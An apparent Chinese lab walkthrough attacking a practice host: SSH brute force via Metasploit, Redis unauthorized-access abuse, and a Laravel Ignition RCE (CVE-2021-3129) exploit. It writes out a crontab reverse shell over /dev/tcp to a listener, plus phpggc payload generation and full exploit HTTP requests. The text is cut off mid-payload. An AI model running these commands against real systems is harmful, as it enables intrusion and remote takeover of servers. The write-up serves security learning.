+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301123639003.png" srcset="/img/loading.gif" lazyload alt="image-20240301123639003"></p>
+<p>啥也没有</p>
+</li>
+</ol>
+<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>由于已知ip就不需要将域名反差ip 了</p>
+<h3 id="已知ip"><a href="#已知ip" class="headerlink" title="已知ip"></a>已知ip</h3><h4 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301124007201.png" srcset="/img/loading.gif" lazyload alt="image-20240301124007201"></p>
+<p>查看81端口是什么</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301151740051.png" srcset="/img/loading.gif" lazyload alt="image-20240301151740051"></p>
+<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><ol>
+<li><p>msf尝试利用22 端口</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf6 auxiliary(scanner<span class="hljs-regexp">/ssh/</span>ssh_login) &gt; set user_file <span class="hljs-regexp">/home/</span>kali/users.txt<br>user_file =&gt; <span class="hljs-regexp">/home/</span>kali/users.txt<br>msf6 auxiliary(scanner<span class="hljs-regexp">/ssh/</span>ssh_login) &gt; set pass_file <span class="hljs-regexp">/home/</span>kali/password.txt<br>pass_file =&gt; <span class="hljs-regexp">/home/</span>kali/password.txt<br>msf6 auxiliary(scanner<span class="hljs-regexp">/ssh/</span>ssh_login) &gt; set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">79.163</span>Interrupt: use the <span class="hljs-string">&#x27;exit&#x27;</span> command to quit<br>msf6 auxiliary(scanner<span class="hljs-regexp">/ssh/</span>ssh_login) &gt; set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">79.163</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301124348496.png" srcset="/img/loading.gif" lazyload alt="image-20240301124348496"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301124620606.png" srcset="/img/loading.gif" lazyload alt="image-20240301124620606"></p>
+</li>
+<li><p>尝试使用6379</p>
+<p>是否存在redis 未授权访问</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301124921812.png" srcset="/img/loading.gif" lazyload alt="image-20240301124921812"></p>
+<blockquote>
+<p><a href="https://tsy244.github.io/2024/01/11/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">https://tsy244.github.io/2024/01/11/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</a></p>
+</blockquote>
+<ul>
+<li><p>尝试生成公钥</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301130020068.png" srcset="/img/loading.gif" lazyload alt="image-20240301130020068"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">( <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\n\n&quot;</span> ;<span class="hljs-built_in">cat</span> temp_keys.pub ;<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\n\n&quot;</span> )&gt; redis_keys<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301130251739.png" srcset="/img/loading.gif" lazyload alt="image-20240301130251739"></p>
+<p>通过Redis 命令行执行指令的方式，设置x 的values为ssh_key</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> redis_keys | redis-<span class="hljs-keyword">cli</span> -<span class="hljs-keyword">h</span> 192.168.79.163 -x <span class="hljs-keyword">set</span> <span class="hljs-keyword">m</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301130858830.png" srcset="/img/loading.gif" lazyload alt="image-20240301130858830"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131010083.png" srcset="/img/loading.gif" lazyload alt="image-20240301131010083"></p>
+<p>已经存在，设置工作目录</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131209899.png" srcset="/img/loading.gif" lazyload alt="image-20240301131209899"></p>
+<p>发现问题，权限不够</p>
+<p>查看工作目录<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131715015.png" srcset="/img/loading.gif" lazyload alt="image-20240301131715015"></p>
+<p>猜测用户名为web </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131802848.png" srcset="/img/loading.gif" lazyload alt="image-20240301131802848"></p>
+<p>成功</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131954778.png" srcset="/img/loading.gif" lazyload alt="image-20240301131954778"></p>
+<p>尝试连接</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301132420865.png" srcset="/img/loading.gif" lazyload alt="image-20240301132420865"></p>
+<p>由于用户存在密码所以登录失败</p>
+</li>
+<li><p>尝试写webshell</p>
+<p>只能猜测Web 路径</p>
+<p>&#x2F;var&#x2F;www&#x2F;html</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301134404211.png" srcset="/img/loading.gif" lazyload alt="image-20240301134404211"></p>
+</li>
+<li><p>尝试写定时任务</p>
+<p>首先开启监听</p>
+<p>然后设置离路径</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301134758399.png" srcset="/img/loading.gif" lazyload alt="image-20240301134758399"></p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">set</span> m <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.79.137/19999 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301135042826.png" srcset="/img/loading.gif" lazyload alt="image-20240301135042826"></p>
+<p>感觉不行</p>
+</li>
+<li><p>主从复制</p>
+<p>利用失败</p>
+</li>
+<li><p>由于权限问题，应该使用root 权限启动服务的</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301160815016.png" srcset="/img/loading.gif" lazyload alt="image-20240301160815016"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301161032141.png" srcset="/img/loading.gif" lazyload alt="image-20240301161032141"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301161450582.png" srcset="/img/loading.gif" lazyload alt="image-20240301161450582"></p>
+<blockquote>
+<p>注意</p>
+<ol>
+<li>这里最好指定用户，因为我们是存放到root 所以我们使用root 用户登录</li>
+<li>因为保存的不是在默认的文件地点，所以使用 -i 选项进行指定</li>
+</ol>
+</blockquote>
+<p>如果作者是要求使用普通用户的话，俺就没有办法利用了</p>
+</li>
+</ul>
+</li>
+<li><p>81端口</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301162752272.png" srcset="/img/loading.gif" lazyload alt="image-20240301162752272"></p>
+<p>使用xray 搜索是否存在漏洞</p>
+<p>网上搜索了一下漏洞</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/280508.html">Laravel RCE（CVE-2021-3129）漏洞复现 - FreeBuf网络安全行业门户</a></p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301163311627.png" srcset="/img/loading.gif" lazyload alt="image-20240301163311627"></p>
+<p>主状态500 说明可能存在问题</p>
+<p>下载工具</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ambionics/</span>phpggc.git<br></code></pre></td></tr></table></figure>
+
+
+
+<p>添加执行权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x phpggc<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301164215234.png" srcset="/img/loading.gif" lazyload alt="image-20240301164215234"></p>
+<p>用phpggc生成phar序列化利用POC</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> .<span class="hljs-regexp">/phpggc Laravel/</span>RCE5 <span class="hljs-string">&quot;phpinfo();&quot;</span> --phar phar -o php:<span class="hljs-regexp">//</span>output | base64 -w <span class="hljs-number">0</span> | python -c <span class="hljs-string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301164456654.png" srcset="/img/loading.gif" lazyload alt="image-20240301164456654"></p>
+<p>但是这个poc 实际上不能使用还需要在最后添加一个a</p>
+<p>清除原来的日志</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>139xxx:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>330<br><br><span class="language-swift"></span><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>给Log增加一次前缀，用于对齐</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>139.xxx:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>155<br><br><span class="language-swift"></span><br><span class="language-swift">&#123;</span><br><span class="language-swift"> <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift"> <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;variableName&quot;</span>:<span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift"><span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;AA&quot;</span></span><br><span class="language-swift"> &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>139.xxxxx:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5050<br><br><span class="language-dns"></span><br><span class="language-dns">&#123;</span><br><span class="language-dns"> &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="language-dns"> &quot;parameters&quot;: &#123;</span><br><span class="language-dns">  &quot;variableName&quot;:&quot;username&quot;,</span><br><span class="language-dns">&quot;viewFile&quot;: &quot;=<span class="hljs-number">50=00=44=00</span>=<span class="hljs-number">39=00=77=00</span>=<span class="hljs-number">61=00=48=00</span>=<span class="hljs-number">41=00=67=00</span>=<span class="hljs-number">58=00=31=00</span>=<span class="hljs-number">39=00=49=00</span>=<span class="hljs-number">51=00=55=00</span>=<span class="hljs-number">78=00=55=00</span>=<span class="hljs-number">58=00=30=00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=50=00=54</span>=<span class="hljs-number">00=56=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=54=00=45</span>=<span class="hljs-number">00=56=00=53</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=37=00=49</span>=<span class="hljs-number">00=44=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">2</span>B=<span class="hljs-number">00=44=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=66=00=41</span>=<span class="hljs-number">00=67=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=67=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=42=00=45</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=42=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=44</span>=<span class="hljs-number">00=49=00=41</span>=<span class="hljs-number">00=51=00=41</span>=<span class="hljs-number">00=41=00=54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=53</span>=<span class="hljs-number">00=57=00=78</span>=<span class="hljs-number">00=73=00=64</span>=<span class="hljs-number">00=57=00=31</span>=<span class="hljs-number">00=70=00=62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=46=00=30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=56=00=78</span>=<span class="hljs-number">00=43=00=63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=39=00=68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=68=00=63</span>=<span class="hljs-number">00=33=00=52</span>=<span class="hljs-number">00=70=00=62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=64=00=63</span>=<span class="hljs-number">00=55=00=47</span>=<span class="hljs-number">00=56=00=75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">75</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=79=00=62</span>=<span class="hljs-number">00=32=00=46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=59=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=64=00=43</span>=<span class="hljs-number">00=49=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=70=00=37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">35</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=69=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>B=<span class="hljs-number">00=67=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">64</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00=56=00=75</span>=<span class="hljs-number">00=64=00=48</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=30=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=55=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=73=00=62</span>=<span class="hljs-number">00=48=00=56</span>=<span class="hljs-number">00=74=00=61</span>=<span class="hljs-number">00=57=00=35</span>=<span class="hljs-number">00=68=00=64</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00=63=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=45</span>=<span class="hljs-number">00=52=00=70</span>=<span class="hljs-number">00=63=00=33</span>=<span class="hljs-number">00=42=00=68</span>=<span class="hljs-number">00=64=00=47</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=45=00=36</span>=<span class="hljs-number">00=65=00=33</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00=54=00=59</span>=<span class="hljs-number">00=36=00=49</span>=<span class="hljs-number">00=67=00=41</span>=<span class="hljs-number">00=71=00=41</span>=<span class="hljs-number">00=48=00=46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">31</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">55</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">56</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00=78=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=32=00=45</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=70=00=37</span>=<span class="hljs-number">00=61=00=54</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">77</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=30=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=55=00=36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=31=00=76</span>=<span class="hljs-number">00=59=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">74</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00=63=00=54</span>=<span class="hljs-number">00=47=00=39</span>=<span class="hljs-number">00</span>=<span class="hljs-number">68</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=47=00=56</span>=<span class="hljs-number">00=79=00=58</span>=<span class="hljs-number">00=45=00=56</span>=<span class="hljs-number">00=32=00=59</span>=<span class="hljs-number">00=57=00=78</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00=62=00=32</span>=<span class="hljs-number">00</span>=<span class="hljs-number">46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=58=00=49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=41=00=36</span>=<span class="hljs-number">00=65=00=33</span>=<span class="hljs-number">00=31=00=70</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=45=00=37</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">7</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">30</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=73=00=62</span>=<span class="hljs-number">00=32=00=46</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00</span>=<span class="hljs-number">49</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=74=00=39</span>=<span class="hljs-number">00=66=00=58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">44</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00=69=00=41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">43</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>F=<span class="hljs-number">00</span>=<span class="hljs-number">41</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">58</span>=<span class="hljs-number">00</span>=<span class="hljs-number">5</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>C=<span class="hljs-number">00</span>=<span class="hljs-number">62</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>E=<span class="hljs-number">00=51=00=69</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>F=<span class="hljs-number">00=30=00=38</span>=<span class="hljs-number">00</span>=<span class="hljs-number">36</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>D=<span 